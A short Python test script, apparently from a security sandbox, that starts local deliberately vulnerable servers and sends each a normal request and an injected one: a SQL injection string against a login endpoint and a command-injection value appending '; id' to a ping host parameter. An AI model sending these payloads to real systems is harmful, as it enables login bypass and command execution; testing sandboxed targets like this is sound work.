import urllib.request
import urllib.parse
from adapt.sandbox.targets.vulnerable_apps.sim_server import VulnerableAppServer

def test_sqli():
    print("--- Testing SQLi Target ---")
    with VulnerableAppServer("sqli") as srv:
        url = f"{srv.url}/login?user=admin"
        print(f"Normal request to: {url}")
        try:
            resp = urllib.request.urlopen(url).read().decode()
            print(f"Response: {resp}")
        except Exception as e:
            print(f"Error: {e}")

        # Injecting SQL
        url_injected = f"{srv.url}/login?user=" + urllib.parse.quote("admin' OR '1'='1")
        print(f"Injected request to: {url_injected}")
        try:
            resp = urllib.request.urlopen(url_injected).read().decode()
            print(f"Response: {resp}")
        except Exception as e:
            print(f"Error: {e}")

def test_cmdi():
    print("\n--- Testing CMDi Target ---")
    with VulnerableAppServer("cmdi") as srv:
        url = f"{srv.url}/ping?host=127.0.0.1"
        print(f"Normal request to: {url}")
        try:
            resp = urllib.request.urlopen(url).read().decode()
            print(f"Response: {resp}")
        except Exception as e:
            print(f"Error: {e}")

        # Injecting Command
        url_injected = f"{srv.url}/ping?host=" + urllib.parse.quote("127.0.0.1; id")
        print(f"Injected request to: {url_injected}")
        try:
            resp = urllib.request.urlopen(url_injected).read().decode()
            print(f"Response: {resp}")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    test_sqli()
    test_cmdi()
